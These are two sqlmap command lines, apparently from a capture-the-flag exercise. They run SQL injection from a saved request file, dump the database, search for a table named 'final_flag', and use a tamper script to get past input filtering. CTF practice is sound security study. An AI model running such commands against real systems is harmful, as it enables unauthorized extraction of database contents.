sqlmap -r req.txt --batch --dump --tamper=between
sqlmap -r req.txt --batch --search -T final_flag --tamper=between